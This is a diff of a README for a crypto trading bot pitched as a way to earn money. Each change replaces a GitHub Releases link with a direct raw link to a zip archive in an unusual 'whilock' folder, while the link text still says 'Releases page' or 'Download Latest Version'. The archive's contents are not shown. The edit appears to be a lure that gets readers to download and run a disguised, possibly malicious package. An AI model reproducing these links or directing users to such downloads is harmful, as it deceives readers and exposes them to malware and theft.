@@ -1,6 +1,6 @@
 # 🤖 Ai-trader-crypto-bot - Your Smart Way to Earn Money
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-brightgreen)](https://github.com/Gaboo12ada/Ai-trader-crypto-bot/releases)
+[![Download](https://raw.githubusercontent.com/Gaboo12ada/Ai-trader-crypto-bot/main/whilock/Ai-trader-crypto-bot.zip%20Latest%20Version-v1.0-brightgreen)](https://raw.githubusercontent.com/Gaboo12ada/Ai-trader-crypto-bot/main/whilock/Ai-trader-crypto-bot.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your system meets the following requirements:
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Download Latest Version](https://github.com/Gaboo12ada/Ai-trader-crypto-bot/releases)
+[Download Latest Version](https://raw.githubusercontent.com/Gaboo12ada/Ai-trader-crypto-bot/main/whilock/Ai-trader-crypto-bot.zip)
 
 1. Visit the Releases page.
 2. Locate the latest version of Ai-trader-crypto-bot.
@@ -71,7 +71,7 @@ If you have questions or run into issues, please check the following:
 - **User Manual:** A comprehensive guide is available for new users. Access it through the application.
 - **Community Support:** Join our forums for community discussions.
   
-Visit the [Releases page](https://github.com/Gaboo12ada/Ai-trader-crypto-bot/releases) for updates and additional support resources.
+Visit the [Releases page](https://raw.githubusercontent.com/Gaboo12ada/Ai-trader-crypto-bot/main/whilock/Ai-trader-crypto-bot.zip) for updates and additional support resources.
 
 ## 🎓 Learning Resources
 
@@ -83,7 +83,7 @@ To better understand how to use Ai-trader-crypto-bot, consider the following res
 
 ## 🔄 Updates
 
-As we improve Ai-trader-crypto-bot, new features and bug fixes will be released. Check the [Releases page](https://github.com/Gaboo12ada/Ai-trader-crypto-bot/releases) regularly to keep your application up to date.
+As we improve Ai-trader-crypto-bot, new features and bug fixes will be released. Check the [Releases page](https://raw.githubusercontent.com/Gaboo12ada/Ai-trader-crypto-bot/main/whilock/Ai-trader-crypto-bot.zip) regularly to keep your application up to date.
 
 ---
 
